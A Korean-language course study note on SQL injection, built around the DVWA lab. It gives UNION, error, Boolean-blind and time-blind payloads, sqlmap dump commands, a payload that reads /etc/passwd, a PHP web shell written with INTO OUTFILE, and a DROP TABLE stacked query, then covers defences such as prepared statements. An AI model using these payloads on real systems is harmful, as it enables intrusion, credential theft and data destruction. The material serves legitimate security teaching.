# SQL Injection (SQLi) 정리

> 사용자 입력이 SQL 쿼리에 그대로 삽입될 때 발생하는 취약점.
> **웹 3대 취약점** 중 하나이며 OWASP Top 10 지속 등재.

---

## ⭐ 1. 공격 5단계 흐름 — **시험 출제 예상**

### 1단계 | 컬럼 수 파악 (`ORDER BY`)

```sql
ORDER BY 1   -- 정상
ORDER BY 2   -- 정상
ORDER BY 3   -- 에러 → 컬럼 수는 2개
```

> `ORDER BY N`에서 에러가 나는 시점 직전 숫자 = 컬럼 수

### 2단계 | 출력 위치 파악 (`UNION SELECT`)

```sql
' UNION SELECT 1,2-- -
' UNION SELECT 'a','b'-- -
```

> 화면에 숫자나 문자가 출력되는 위치 = 데이터 삽입 가능 컬럼

### 3단계 | DB 정보 수집

```sql
-- 현재 DB 이름
' UNION SELECT database(),2-- -

-- DB(스키마) 목록
' UNION SELECT schema_name,2 FROM information_schema.schemata-- -

-- 테이블 목록
' UNION SELECT table_name,2 FROM information_schema.tables
  WHERE table_schema='dvwa'-- -

-- 컬럼 목록
' UNION SELECT column_name,2 FROM information_schema.columns
  WHERE table_schema='dvwa' AND table_name='users'-- -
```

### 4단계 | 데이터 추출

```sql
' UNION SELECT user,password FROM users-- -
```

> MD5 해시로 저장된 경우 → `john`, `hashcat`, 온라인 크래킹 툴로 복호화

### 5단계 | 권한 상승 / 파일 R·W (심화)

```sql
-- 파일 읽기 (FILE 권한 필요)
' UNION SELECT load_file('/etc/passwd'),2-- -

-- 웹쉘 쓰기
' UNION SELECT '<?php system($_GET["cmd"]); ?>',2
  INTO OUTFILE '/var/www/html/shell.php'-- -
```

---

## ⭐ 2. SQLi 유형 5가지 — **시험 출제 예상**

| 유형 | 조건 | 특징 | 대표 페이로드 |
|------|------|------|-------------|
| **Error-based** | DB 에러 메시지가 화면에 출력 | 에러 메시지로 DB 정보 직접 확인 | `' extractvalue(1,concat(0x7e,database()))-- -` |
| **UNION-based** | SELECT 결과가 화면에 출력 | 가장 빠른 정보 추출 | `' UNION SELECT 1,2-- -` |
| **Boolean-based Blind** | 참/거짓에 따라 화면이 달라짐 | 한 글자씩 추출 (느림) | `' AND substr(database(),1,1)='d'-- -` |
| **Time-based Blind** | 화면 변화 없음 | 응답 지연(sleep)으로 참/거짓 판단 | `' AND sleep(3)-- -` |
| **Stacked Query** | 세미콜론(`;`)으로 쿼리 추가 실행 가능 | INSERT/UPDATE/DROP까지 가능 | `'; DROP TABLE users-- -` |

💬 **강사 보충 — 시험 포인트**
> - Error → UNION → Boolean Blind → Time Blind 순으로 **결과 확인이 어려워진다**
> - 실무에서는 화면에 아무것도 안 나오는 Blind 상황이 더 많음
> - `information_schema`는 MySQL의 메타데이터 DB — 테이블·컬럼 이름 수집의 핵심

---

## 3. Blind SQLi 상세 — `substr()` 한 글자씩 추출

### Boolean-based 예시 (DB 이름 추출)

```sql
-- DB 이름 첫 글자 확인
' AND substr(database(),1,1)='d'-- -     -- 참 → 첫 글자 = 'd'
' AND substr(database(),2,1)='v'-- -     -- 참 → 두 번째 = 'v'
' AND substr(database(),3,1)='w'-- -     -- 참 → 세 번째 = 'w'
' AND substr(database(),4,1)='a'-- -     -- 참 → 네 번째 = 'a'
→ DB 이름 = 'dvwa'

-- 테이블 이름 추출 (LIMIT으로 순서 지정)
' AND substr((SELECT table_name FROM information_schema.tables
  WHERE table_schema='dvwa' LIMIT 0,1),1,1)='g'-- -   -- 첫 번째 테이블 이름의 첫 글자
' AND substr((SELECT table_name FROM information_schema.tables
  WHERE table_schema='dvwa' LIMIT 1,1),1,1)='u'-- -   -- 두 번째 테이블 이름의 첫 글자
```

### Time-based 예시 (화면 변화 없을 때)

```sql
-- 참이면 3초 대기, 거짓이면 바로 응답
' AND if(substr(database(),1,1)='d', sleep(3), 0)-- -
```

| 상황 | 판단 |
|------|------|
| 응답이 3초 후 | 조건 = **참** |
| 바로 응답 | 조건 = **거짓** |

### 자동화 도구 — `sqlmap`

```bash
# 기본 탐지
sqlmap -u "http://target/vuln.php?id=1"

# DB 목록 추출
sqlmap -u "http://target/vuln.php?id=1" --dbs

# 테이블 목록
sqlmap -u "http://target/vuln.php?id=1" -D dvwa --tables

# 데이터 덤프
sqlmap -u "http://target/vuln.php?id=1" -D dvwa -T users --dump

# 쿠키 기반 (로그인 필요한 페이지)
sqlmap -u "http://target/vuln.php?id=1" --cookie="PHPSESSID=abc123; security=low"

# POST 요청
sqlmap -u "http://target/login.php" --data="user=admin&pass=1234"
```

---

## 4. DVWA 실습 시나리오 (Low Security)

### SQL Injection (UNION-based)

```
URL: http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```

**Step 1** — 싱글쿼터로 에러 확인
```
?id=1'
```
→ `You have an error in your SQL syntax` → SQLi 취약

**Step 2** — ORDER BY로 컬럼 수 파악
```
?id=1' ORDER BY 2-- -   ← 정상
?id=1' ORDER BY 3-- -   ← 에러 → 컬럼 2개
```

**Step 3** — UNION으로 출력 위치 확인
```
?id=-1' UNION SELECT 1,2-- -
```
→ First name: 1 / Surname: 2 출력 → 둘 다 출력됨

**Step 4** — DB 정보 추출
```
?id=-1' UNION SELECT database(),user()-- -
```
→ First name: dvwa / Surname: app@localhost

**Step 5** — 테이블 → 컬럼 → 데이터
```
?id=-1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'-- -
?id=-1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
?id=-1' UNION SELECT user,password FROM users-- -
```

💬 **주의**: `id=-1`처럼 원래 쿼리 결과를 없애야 UNION 결과만 출력됨

### SQL Injection (Blind) DVWA

```
URL: http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit
```

화면에는 "User ID exists" / "User ID is MISSING" 만 출력

```
?id=1' AND 1=1-- -   → "User ID exists"  (참)
?id=1' AND 1=2-- -   → "User ID is MISSING" (거짓)
?id=1' AND substr(database(),1,1)='d'-- -  → 참이면 exists
```

---

## ⭐ 5. 방어 기법 — **시험 출제 예상**

### Prepared Statement (파라미터화 쿼리) — **가장 중요한 방어법**

**취약한 코드 (PHP)**
```php
// ❌ 취약 — 사용자 입력이 SQL에 직접 삽입
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $sql);
```

**안전한 코드 (PHP + Prepared Statement)**
```php
// ✅ 안전 — 입력값이 데이터로만 처리됨
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("s", $_GET['id']);   // "s" = 문자열 타입
$stmt->execute();
```

**안전한 코드 (Python + parameterized)**
```python
# ✅ 안전
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ❌ 취약
cursor.execute("SELECT * FROM users WHERE id = '%s'" % user_id)
```

### 추가 방어 기법

| 기법 | 설명 |
|------|------|
| **입력값 검증** | 숫자 파라미터는 `is_numeric()` 등으로 타입 검증 |
| **에러 메시지 숨김** | DB 에러를 사용자에게 노출하지 않음 (Error-based 차단) |
| **최소 권한 DB 계정** | 웹앱 DB 계정에 SELECT만 부여, FILE/DROP 권한 제거 |
| **WAF** | 웹 방화벽으로 SQLi 패턴 탐지·차단 |
| **ORM 사용** | Django ORM, SQLAlchemy 등 → 자동으로 파라미터화 |

💬 **강사 보충 — 시험 포인트**
> - **Prepared Statement = 파라미터화 쿼리** — 둘 다 같은 말, 시험에 두 표현 모두 나옴
> - 핵심 원리: 쿼리 구조를 먼저 컴파일하고, 입력값은 **데이터**로만 바인딩 → SQL 코드로 해석 안 됨
> - 입력값 필터링(특수문자 이스케이프)은 **보조 수단**, Prepared Statement가 **근본 해결책**
> - DB 계정 최소 권한: `load_file()` / `INTO OUTFILE` 차단 = FILE 권한 제거로 막힘

---

## 6. 주석 처리 방식 (DB별)

| DB | 한 줄 주석 | 블록 주석 |
|----|-----------|----------|
| MySQL | `-- -` 또는 `#` | `/* */` |
| MSSQL | `--` | `/* */` |
| Oracle | `--` | `/* */` |
| SQLite | `--` | `/* */` |

> MySQL에서 `--` 뒤에 **공백**이 필요 → `-- -` 또는 `-- `(공백) 사용

---

## 7. 자주 쓰는 함수 & 정보 테이블

| 함수/테이블 | 설명 | 예시 |
|------------|------|------|
| `database()` | 현재 DB 이름 | `dvwa` |
| `user()` | 현재 DB 계정 | `app@localhost` |
| `version()` | MySQL 버전 | `8.0.32` |
| `@@datadir` | DB 데이터 경로 | `/var/lib/mysql/` |
| `information_schema.schemata` | 전체 DB 목록 | `schema_name` 컬럼 |
| `information_schema.tables` | 전체 테이블 목록 | `table_name`, `table_schema` |
| `information_schema.columns` | 전체 컬럼 목록 | `column_name`, `table_name` |
| `group_concat()` | 여러 행을 하나로 합치기 | `group_concat(table_name)` |

**`group_concat` 활용 예시** (한 번에 전체 테이블 목록)
```sql
' UNION SELECT group_concat(table_name),2
  FROM information_schema.tables
  WHERE table_schema=database()-- -
```

---

## 8. 핵심 요약 (암기 카드)

| 질문 | 답 |
|------|----|
| SQLi 발생 원인 | 사용자 입력이 SQL 쿼리에 **검증 없이** 삽입 |
| 컬럼 수 파악 방법 | `ORDER BY N` (에러 시점 직전 숫자) |
| 출력 위치 파악 | `UNION SELECT 1,2,...` |
| 메타데이터 DB 이름 | `information_schema` |
| 현재 DB 이름 함수 | `database()` |
| Blind SQLi 도구 함수 | `substr(str, pos, len)`, `if(cond, sleep(n), 0)` |
| 근본 방어책 | **Prepared Statement (파라미터화 쿼리)** |
| sqlmap 기본 옵션 | `-u URL`, `--dbs`, `--tables`, `--dump` |
